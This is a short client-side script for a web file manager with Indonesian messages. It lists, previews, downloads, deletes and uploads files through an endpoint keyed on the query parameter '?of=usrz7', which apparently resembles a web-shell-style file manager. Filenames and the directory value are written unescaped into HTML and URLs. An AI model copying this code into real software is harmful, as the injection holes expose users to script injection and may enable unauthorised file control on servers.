<script>
const FILES=JSON.parse('{{filelist}}');
const currentDir='{{currentDir}}';
const csrf='{{csrf}}';
const listEl=document.getElementById('filelist');
const previewEl=document.getElementById('preview');
const uploadArea=document.getElementById('uploadArea');
const fileInput=document.getElementById('fileinput');
const uploadBtn=document.getElementById('uploadBtn');

function renderList(){
  listEl.innerHTML = FILES.map(f=>`
    <div class="item">
      <span>${f}</span>
      <div class="actions">
        <a href="?of=usrz7&dir=${currentDir}&download=${encodeURIComponent(f)}" target="_blank">Download</a>
        <form method="post" style="display:inline" action="?of=usrz7&dir=${currentDir}">
          <input type="hidden" name="file" value="${f}">
          <input type="hidden" name="csrf" value="${csrf}">
          <input type="hidden" name="action" value="delete">
          <button type="submit">Delete</button>
        </form>
      </div>
    </div>
  `).join('');

  document.querySelectorAll('#filelist .item span').forEach(el=>{
    el.addEventListener('click',()=>{
      const name=el.textContent;
      const ext=name.split('.').pop().toLowerCase();
      if(['png','jpg','jpeg','webp'].includes(ext)){
        previewEl.innerHTML=`<img src="?of=usrz7&dir=${currentDir}&download=${encodeURIComponent(name)}"/>`;
      } else if(ext==='pdf'){
        previewEl.innerHTML=`<iframe src="?of=usrz7&dir=${currentDir}&download=${encodeURIComponent(name)}"></iframe>`;
      } else {
        previewEl.textContent='Tidak ada preview untuk file ini';
      }
    });
  });
}

uploadArea.addEventListener('click',()=>fileInput.click());
uploadArea.addEventListener('dragover',e=>{ e.preventDefault(); uploadArea.classList.add('dragover'); });
uploadArea.addEventListener('dragleave',e=>{ e.preventDefault(); uploadArea.classList.remove('dragover'); });
uploadArea.addEventListener('drop',e=>{
  e.preventDefault();
  uploadArea.classList.remove('dragover');
  fileInput.files = e.dataTransfer.files;
});

uploadBtn.addEventListener('click',()=>{
  if(!fileInput.files.length){ alert('Pilih file'); return; }
  const fd=new FormData();
  fd.append('file',fileInput.files[0]);
  fd.append('csrf',csrf);
  fd.append('action','upload');
  fetch(`?of=usrz7&dir=${currentDir}`, { method:'POST', body:fd })
    .then(r=>r.text()).then(()=>location.reload());
});

renderList();
</script>
